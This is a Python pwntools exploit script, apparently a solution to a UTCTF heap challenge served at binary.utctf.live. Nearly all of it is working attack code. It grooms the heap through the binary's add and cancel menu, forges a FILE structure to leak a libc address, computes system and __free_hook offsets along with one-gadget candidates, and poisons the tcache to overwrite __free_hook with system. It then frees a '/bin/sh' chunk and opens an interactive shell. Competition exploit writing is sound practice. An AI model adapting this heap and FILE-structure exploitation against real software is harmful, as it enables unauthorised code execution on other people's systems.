from pwn import *
import signal
import sys

def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
#signal.signal(signal.SIGINT, signal_handler)
#print('Press Ctrl+C')
# Init config
context.arch = 'amd64' 
#context.log_level = logging.DEBUG #with debug output
prog_name = './pwnable'
context.binary = prog_name 
## init of python
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("binary.utctf.live", 9050)
  online=True
elif(debug == 1):
  r = process(prog_name)#, aslr=False)
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def halt():
  while True:
    log.info( r.recvline() )

def add(index, name, length, desc, waithere=False):
  if waithere:
    r.recvuntil(">")
  r.sendline(str(1))
  r.recvuntil("Index:")
  r.sendline(str(index))
  r.recvuntil("Name:")
  r.sendline(name)
  r.recvuntil("Length of description:")
  r.sendline(str(length))
  r.recvuntil("Description:")
  r.send(desc) # e' una read quindi supponiamo che il nostro input sia sempre della dimensione esatta
  #r.recvuntil("Menu:")

def cancel(index, waithere=True):
  if waithere:
    r.recvuntil(">")
  r.sendline(str(2))
  r.recvuntil("Index:")
  r.sendline(str(index))

# or if you have issue, use interactive but instead you need to open it in another terminal
def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def file_fd():
  payload = ""
  payload += p64(0xfbad1800)
  payload += p64(0x0) # _IO_read_ptr = 0x1555553277e3, 
  payload += p64(0x0) # _IO_read_end = 0x1555553277e3, 
  payload += p64(0x0) # _IO_read_base = 0x1555553277e3, 
  payload += "\x00"   # _IO_write_base = 0x1555553277e3, 
  return payload      #size = 0x21

def pwn():
  #if not online:
  if False:
    gdb.attach(r, '''
      set follow-fork-mode child
      c
      ''')
  inc=0
  lst = [str(x) for x in range(6) ]
  for index, elem in enumerate(lst):
    add(index+inc, elem*0x8, 0x30 - 0x8, "\n")
  inc += len(lst) #6

  cancel(0)
  add(0, "0"*0x8, 0x30-0x8, "A"*0x28+ "\x41")
  cancel(1)

  cancel(3)
  cancel(5)
  cancel(4)
  cancel(2)
  inc = 1

  lst = [str(x) for x in range(8) ]
  for index, elem in enumerate(lst):
    add(index+inc, elem*0x8, 0x90- 0x8, "\n")
  inc += len(lst) #8

  for index in range(inc-1, 0, -1):
    cancel(index)
  inc = 1
  
  add(1, "a", 0x30, p64(0)*6 + "\x80")
  # now we have:
  # 0x30 [  4]: 0x5555557572c0 -> 0x555555757380 -> 0x155555326ca0 (main_arena+96) -> 0x5555557577f0 <- 0x0
  #
  # and so we must guess 8bit
  # after some distribution freq_absolute(0xf760)=9485  look at 'main_distrib.c'
  add(2, "a", 0x50-0x8, "\x60\xf7")  
  #r.interactive()
  #add(2, "a", 0x50 -0x8, "\x60\x77") #ALSO for NOaslr then remove it

  add(0, "0"*0x8, 0x30-0x8, "A"*0x28, waithere=False)
  add(0, "0"*0x8, 0x30-0x8, "A"*0x28)
  add(3, "leak", 0x30-0x8, file_fd())
  leak_stdout=u64("".join(r.recvline()[-25-8:-25]))
  libc_base = (leak_stdout - 0xa00) - 0x3eb000

  system = libc_base + 0x4f440
  free_hook = libc_base + 0x3ed8e8
  one_gadgets = [ x + libc_base for x in [0x4f2c5, 0x4f322, 0x10a38c]]
  comment="""
    0x4f2c5 constraints: rcx == NULL
    0x4f322 constraints: [rsp+0x40] == NULL
    0x10a38c constraints: [rsp+0x70] == NULL
  """
  print("[+] leak_from_stdout_fd = 0x{0:x}".format(leak_stdout))
  print("[+] libc baseaddr = 0x{0:x}".format(libc_base))
  print("[+] __free_hook = 0x{0:x}".format(free_hook))
  print("[+] system = 0x{0:x}".format(system))

  # ignore unsorted chunk  
  for x in range(2):
    add(x, str(x)*0x8, 0x20-0x8, "A\n")

  for x in range(6):
    add(x, str(x)*0x8, 0x20-0x8, "A\n")

  inc = 6
  cancel(0, waithere=False)
  add(0, "0"*0x8, 0x20-0x8, "A"*0x18 + "\x41") 
  cancel(1, waithere=False)

  for x in range(inc-1, 1, -1):
    cancel(x, waithere=False)

  cancel(0, waithere=False)

  # Final step, overwrite hook, and pop a shell
  add(0, "pino1", 0x40-0x8, "A"*0x20 + p64(free_hook))
  add(1, "pino2", 0x20-0x8, "/bin/sh\x00")
  add(2, "pino2", 0x20-0x8, "/bin/sh\x00")
  add(3, "pino2", 0x20-0x8, p64(system))

  cancel(1, waithere=False)
  r.interactive()
  # cat flag.txt 

  return

pwn()


